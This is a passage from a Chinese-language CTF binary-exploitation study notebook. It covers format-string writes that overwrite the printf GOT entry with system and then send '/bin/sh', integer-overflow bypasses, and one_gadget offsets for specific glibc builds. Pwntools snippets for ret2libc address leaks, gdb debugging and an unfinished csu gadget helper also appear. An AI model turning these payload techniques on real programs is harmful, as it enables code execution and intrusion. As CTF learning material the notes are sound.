复制到栈上，需要按照复制后的栈填充垃圾字符等等</h3>\n<h3 id=\"12整数溢出漏洞比大小绕过判断\"><a class=\"anchor\" href=\"#12整数溢出漏洞比大小绕过判断\">#</a> 12. 整数溢出漏洞（比大小绕过判断），</h3>\n<pre><code>无符号整型 unsigned int 遇到 -1 时会将 -1转化为该无符号整型的最大值\n\nunsigned int ( -1 )=max unsigned int\n\nint (-1)= -1\n\n输入无符号整型时应该输入字符串（”-1“），不能是（b”-1“）\n</code></pre>\n<h3 id=\"13格式化字符串漏洞不仅仅用来泄露canary还可以改变地址内的值\"><a class=\"anchor\" href=\"#13格式化字符串漏洞不仅仅用来泄露canary还可以改变地址内的值\">#</a> 13. 格式化字符串漏洞（不仅仅用来泄露 canary，还可以改变地址内的值）</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span>pwnme地址（<span class=\"token number\">32</span>位是<span class=\"token number\">4</span>字节）<span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token operator\">+</span><span class=\"token string\">b\"%10$n\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    有printf<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>会将输入的payload存入buf偏移为<span class=\"token number\">10</span>的地方<span class=\"token punctuation\">(</span>该偏移需要利用aaaa<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p<span class=\"token operator\">-</span><span class=\"token operator\">%</span>p查看<span class=\"token punctuation\">)</span>，并且将<span class=\"token operator\">%</span><span class=\"token number\">10</span>$前面的八字节大小视作<span class=\"token number\">8</span>存入该地址</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#格式化字符串格式：</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">%</span><span class=\"token punctuation\">[</span>paremeter<span class=\"token punctuation\">]</span> <span class=\"token builtin\">type</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>paremeter<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n$<span class=\"token punctuation\">:</span>获取格式化字符串中的指定参数<span class=\"token punctuation\">(</span>n是栈上相隔多少个的<span class=\"token number\">4</span><span class=\"token operator\">/</span><span class=\"token number\">8</span>字节地址<span class=\"token punctuation\">)</span>，n$的形式，直接指定参数相对于格式化字符串的偏移，可以视作指定数组下标，读取栈上的n<span class=\"token operator\">+</span><span class=\"token number\">1</span>的参数【与<span class=\"token operator\">%</span>n区分】</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token builtin\">int</span> main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    char a<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    char b<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"bbbb\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    char c<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"cccc\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    char d<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"dddd\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    printf<span class=\"token punctuation\">(</span><span class=\"token string\">\"%3$s  %2$s  %1$s\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token comment\">#输出 cccc  bbbb aaaa</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token builtin\">type</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>d<span class=\"token operator\">/</span>i，有符号整数</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>u，无符号整数</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>x<span class=\"token operator\">/</span>X，<span class=\"token number\">16</span> 进制 unsigned <span class=\"token builtin\">int</span> 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 <span class=\"token number\">0</span>。默认精度为 <span class=\"token number\">1</span>。精度为 <span class=\"token number\">0</span> 且值为 <span class=\"token number\">0</span>，则输出为空。</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>o，<span class=\"token number\">8</span> 进制 unsigned <span class=\"token builtin\">int</span> 。如果指定了精度，则输出的数字不足时在左侧补 <span class=\"token number\">0</span>。默认精度为 <span class=\"token number\">1</span>。精度为 <span class=\"token number\">0</span> 且值为 <span class=\"token number\">0</span>，则输出为空。</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>s，如果没有用 l 标志，输出 null 结尾【字符串】直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>c，如果没有用 l 标志，把 【<span class=\"token builtin\">int</span> 参数转为 unsigned char 型】输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p， void <span class=\"token operator\">*</span> 型，输出对应变量的值。printf<span class=\"token punctuation\">(</span>“<span class=\"token operator\">%</span>p”<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">)</span> 用地址的格式打印变量 a 的值，printf<span class=\"token punctuation\">(</span>“<span class=\"token operator\">%</span>p”<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">)</span> 打印变量 a 所在的地址。</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>n，不输出字符，但是把已经成功【输出的字符个数】【写入】对应的整型指针参数所指的变量<span class=\"token punctuation\">(</span>以<span class=\"token number\">16</span>进制方式写入<span class=\"token punctuation\">)</span>。</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token operator\">%</span>， ‘<span class=\"token operator\">%</span>‘字面值，不接受任何 flags<span class=\"token punctuation\">,</span> width。（一般是<span class=\"token operator\">%</span>n<span class=\"token punctuation\">,</span><span class=\"token operator\">%</span>p等使用）</pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>常用<span class=\"token operator\">%</span>p来泄露地址，使用<span class=\"token operator\">%</span>n来实现向指定地址写入数据（<span class=\"token number\">4</span>字节），我们还通常会使用<span class=\"token operator\">%</span>hn（<span class=\"token number\">2</span>字节），<span class=\"token operator\">%</span>hhn（<span class=\"token number\">1</span>字节），<span class=\"token operator\">%</span>lln（<span class=\"token number\">8</span>字节）进行写入</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#任意地址泄露：</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>这时候，如果我们配合`<span class=\"token operator\">%</span>数字$s`<span class=\"token comment\">#数字 $，偏移量：数字，以字符串形式输出</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#任意地址写：</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>输入`<span class=\"token operator\">%</span>数字c<span class=\"token operator\">%</span>数字$n`<span class=\"token comment\">#第一个 `数字 c` 无符号 char 型，【%200c 表示总共输出 200 个字符，如果不足 200 个则在前面补上空字符】，n 就是写入，%5$n 是写入第 5 个常数，b'%11$n' , 将 4 (`%、1、1、$` 四个) 写入偏移 11 的地方</span></pre></td></tr></table></figure><h4 id=\"fmtstr_payload是pwntools里面的一个工具用来简化对格式化字符串漏洞的构造工作\"><a class=\"anchor\" href=\"#fmtstr_payload是pwntools里面的一个工具用来简化对格式化字符串漏洞的构造工作\">#</a> fmtstr_payload 是 pwntools 里面的一个工具，用来简化对格式化字符串漏洞的构造工作。</h4>\n<p>可以实现修改任意内存<br />\n<strong> fmtstr_payload (offset, {printf_got: system_addr})(偏移，{原地址：目的地址})</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fmtstr_payload<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span> writes<span class=\"token punctuation\">,</span> numbwritten<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> write_size<span class=\"token operator\">=</span>‘byte’<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>第一个参数表示格式化字符串的偏移；</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>第二个参数表示需要利用<span class=\"token operator\">%</span>n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成<span class=\"token punctuation\">&#123;</span>printfGOT<span class=\"token punctuation\">:</span>systemAddress<span class=\"token punctuation\">&#125;</span>；本题是将0804a048处改为<span class=\"token number\">0x2223322</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>第三个参数表示已经输出的字符个数，这里没有，为<span class=\"token number\">0</span>，采用默认值即可；</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（<span class=\"token builtin\">int</span>），对应着hhn、hn和n，默认值是byte，即按hhn写。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>fmtstr_payload函数返回的就是payload</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#常用形式:fmtstr_payload (offset,&#123;address1:value1&#125;)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload<span class=\"token operator\">=</span>fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>printf_got<span class=\"token punctuation\">:</span>system<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\\0\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#自动获取偏移：</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_vuln_offset</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    info <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> info</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>vuln_offset <span class=\"token operator\">=</span> FmtStr<span class=\"token punctuation\">(</span>get_vuln_offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>offset</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>log<span class=\"token punctuation\">,</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"vuln_offset => %s\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>vuln_offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code>http://t.csdn.cn/1sJDx\n</code></pre>\n<h3 id=\"14echo-flag-systemecho-flag\"><a class=\"anchor\" href=\"#14echo-flag-systemecho-flag\">#</a> 14.echo flag 【system(&quot;echo flag&quot;)】</h3>\n<pre><code>输出字符串，后面跟什么就输出什么，这里输出&quot;flag&quot;\n</code></pre>\n<h3 id=\"15valatoistr\"><a class=\"anchor\" href=\"#15valatoistr\">#</a> 15.val=atoi(str)</h3>\n<pre><code>将str转为整数型字符串，当第一个字符不能识别为数字时，函数将停止读入输入字符串\n\nstr=&quot;987654&quot; ,val=(int)987654\n\nstr=&quot;abc&quot; ,      val=0\n</code></pre>\n<h3 id=\"16-charmallocxsizeofchar\"><a class=\"anchor\" href=\"#16-charmallocxsizeofchar\">#</a> 16. (char*)malloc(x*sizeof(char))</h3>\n<pre><code>分配x字节连续的空间，从堆空间中分配，返回值为分配空间的首地址\n</code></pre>\n<h3 id=\"1732位程序构造rop链时\"><a class=\"anchor\" href=\"#1732位程序构造rop链时\">#</a> 17.32 位程序构造 rop 链时</h3>\n<pre><code>因为32位程序是用栈来传参，调用函数返回地址在前参数在后，所以顺序应当为 ：\n\n函数1+函数2+函数3+函数1的参数+函数2的参数+函数3的参数\n</code></pre>\n<h3 id=\"18修改glibc版本ldd-version-查看当前版本\"><a class=\"anchor\" href=\"#18修改glibc版本ldd-version-查看当前版本\">#</a> 18. 修改 glibc 版本（ldd --version  查看当前版本）</h3>\n<p>当本地 glibc 版本不同会导致堆的地址不同等问题（glibc2.26 版本之后会出现一个新的 TcacheBin，导致释放的 chunk 不会先进入 fastbin 中）</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>patchelf --set-interpreter ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ~/Downloads/buuctf/babyheap_0ctf_2017</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#修改链接库</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>patchelf --set-interpreter ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ~/Desktop/gujianshan/uaf/uafNote</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># patchelf --set-interpreter 链接库 (一般是 ld-2.23.soz) --set-rpath 链接库路径 二进制程序</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># patchelf --set-interpreter ./libc-2.23.so --set-rpath ./ ./ret</span></pre></td></tr></table></figure><p>进入到 /pwn/glibc-all-in-one (自己的目录下)，cat list</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRkcxf.png\" alt=\"\" /></p>\n<p>用 ./download 下载我们需要的版本</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/13/pPRkoin.png\" alt=\"\" /></p>\n<p>使用上面的命令换版本即可</p>\n<p>【下载不超过请换源，vim download, 注释掉清华源，放出官方源】</p>\n<h3 id=\"19-关于malloc_hook\"><a class=\"anchor\" href=\"#19-关于malloc_hook\">#</a> 19. 关于 malloc_hook</h3>\n<p><code>malloc_hook</code>  指向的地址不为空时则执行其指向的函数，可以以此来 gadget（配合  <code>one_gadget</code>  使用）</p>\n<pre><code>malloc_hook=main_arena-0x10\n\n一般：\nfake_chunk=mian_arena-0x33\n所以 malloc_hook=fake_chunk+0x23\n</code></pre>\n<h3 id=\"20-使用one_gadget工具来得到getshell的函数地址在对应的库目录下使用\"><a class=\"anchor\" href=\"#20-使用one_gadget工具来得到getshell的函数地址在对应的库目录下使用\">#</a> 20. 使用 one_gadget 工具来得到 getshell 的函数地址（在对应的库目录下使用）</h3>\n<p>该工具是基于对应的库来查找的，所以使用时 真正地址为 libc_base + 地址， <strong>下面的需要让 rax 满足对应的要求</strong><br />\n one_gadget 对应的库<br />\n（例如：one_gadget <span class=\"exturl\" data-url=\"aHR0cDovL2xpYmMtMi4yMy5zbw==\">libc-2.23.so</span> , 得到如下结果）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/14/pPRzZNV.png\" alt=\"\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdW5yNHYzMS9wLzE1MTczODExLmh0bWw=\">https://www.cnblogs.com/unr4v31/p/15173811.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjcyMA==\">https://xz.aliyun.com/t/2720</span></p>\n<p>one_gadget，这里记一下比较常用的（libc2.23-0ubuntu11.2 版本已经不在使用）：</p>\n<pre><code>og1=[0x45216,0x4526a,0xf02a4,0xf1147]    #libc2.23-0ubuntu11.2\nog2=[0x45226,0x4527a,0xf0364,0xf1207]    #libc2.23-0ubuntu11.3\n</code></pre>\n<p>下面是利用 read 与 gadget 地址的关系爆破修改（1/16 概率）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjYxMTEyLmh0bQ==\">https://bbs.kanxue.com/thread-261112.htm</span></p>\n<h3 id=\"21查询程序对应glibc版本\"><a class=\"anchor\" href=\"#21查询程序对应glibc版本\">#</a> 21. 查询程序对应 glibc 版本</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmd1aS5jYy9lbC8zMzI3NzgzLmh0bWw/YWN0aW9uPW9uQ2xpY2s=\">https://www.ngui.cc/el/3327783.html?action=onClick</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjY5MTU1Lmh0bQ==\">https://bbs.kanxue.com/thread-269155.htm</span></p>\n<pre><code>ldd 程序名  //用ldd命令查看当前对应glibc版本\n</code></pre>\n<p>1.ubuntu 16 环境（glibc 2.23~glibc 2.26）</p>\n<p>2.ubuntu18<sub>ubuntu20 环境（glibc2.26</sub>glibc2.32）</p>\n<p>机制更新</p>\n<p>(1) 在 glibc2.26 之后堆管理器中加入了 tcachebin，tcachebin 是 glibc 2.26 版本引入的一种优化机制，用于管理小型内存块的缓存，以加速内存分配和释放的性能。在 tcachebin 中每种大小的堆块最多只能存放 7 个。</p>\n<p>加入了 tcachebin 后，释放的堆块就会优先进入 tcachebin 中，只有当释放的堆块是一个 large bin chunk (大小大于 0x410)，或者 tcachebin 对应大小的堆块已经满 7 个时才会置入 fastbin 或 unsortedbin 中</p>\n<p>(2) 在加入了 tcachebin 后堆管理器在初始化时会先 malloc 一块大小为 0x251 的堆块存放 tcachebins 中指针</p>\n<p>利用方式（要想堆块释放后进入 unsortedbin 中就要绕过 tcachebin，由于程序有堆块申请数量限制难以填满 tcachebin 所以选择 free 一个大小大于 0x410 的堆块）</p>\n<h3 id=\"22fopenarg1arg2\"><a class=\"anchor\" href=\"#22fopenarg1arg2\">#</a> 22.fopen(&quot;arg1&quot;,&quot;arg2&quot;)</h3>\n<p>arg1 为打开文件名，arg2 为打开文件的访问模式（读写等方式）</p>\n<p>文件不存在则返回 NULL</p>\n<h3 id=\"23gdb本地调试\"><a class=\"anchor\" href=\"#23gdb本地调试\">#</a> 23.gdb 本地调试</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ez_pz_hackover_2016'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>  <span class=\"token comment\">## 会在此处再打开一个终端</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 'b *0x8048600'  ## 在该终端下设置对应断点（要设置在对应函数结束之前），设置完后必须在新终端按下 “c” 来继续进行，再在旧终端里按下回车</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach (p,'b *0x8048600')#【2025 更新，利用 gdb 动调，在 0x8048600 处下了个断点】</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'crash: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>stack<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#接收 s 在栈上的地址</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">'crashme\\x00'</span><span class=\"token operator\">+</span><span class=\"token string\">'aaaaaa'</span><span class=\"token comment\">#crashme\\x00 绕过 if 判断      </span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#必须要在发送的 payload 前面，不然直接发送结束无法查询了【2025 更新，加入在输入函数之后地址的断点后可以在 send 后 pause ()，pause () 是 linxu 下的暂停程序命令】</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#必要的，不能少</span></pre></td></tr></table></figure><p>此处的重点就是在发送 <code>payload</code>  前加入 <code>gdb.attach(p)</code>  和 <code>pause</code> ，发送 <code>payload</code>  后加入 <code>pause()</code> ，然后在产生的新终端内设置断点（也可以在前面直接设置断点： <code>gdb.attach(p,&quot;b *0x8048600&quot;)</code> ）</p>\n<p>然后新终端内输入 <code>c</code>  继续执行，旧终端内按下回车便可以进行查询得到相应的栈情况</p>\n<p>不知道为什么要加入两个 <code>pause（）</code> 才行，前面一个防止程序直接发送结束，无法加入断点；后面一个不加入会导致无法读取栈的情况（程序貌似没有运行结束，个人猜测是设置断点的地方已经不需要栈了）</p>\n<p>后面在一个堆题调试，发现只需要通过 gdb.attach (p) 和 pause () 就能调试，但是这不能是最后一步，后面还要有其他的发送内容</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"OK\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc_base<span class=\"token operator\">=</span>puts<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>aaaa<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#这里就是 “其他的发送内容”</span></pre></td></tr></table></figure><h3 id=\"24命令readelf-s-程序名\"><a class=\"anchor\" href=\"#24命令readelf-s-程序名\">#</a> 24. 命令 readelf -s 程序名</h3>\n<p>直接在终端上运行命令 <code>readelf -s 程序名</code>  可以查看表项（利用 ida 也可以查看）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIFR29.png\" alt=\"\" /></p>\n<h3 id=\"2564位构造csu\"><a class=\"anchor\" href=\"#2564位构造csu\">#</a> 25.64 位构造 csu</h3>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/21/pPIT7JU.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span>rbp<span class=\"token punctuation\">,</span>r12<span class=\"token punctuation\">,</span>r13<span class=\"token punctuation\">,</span>r14<span class=\"token punctuation\">,</span>r15<span class=\"token punctuation\">,</span>ret<span class=\"token 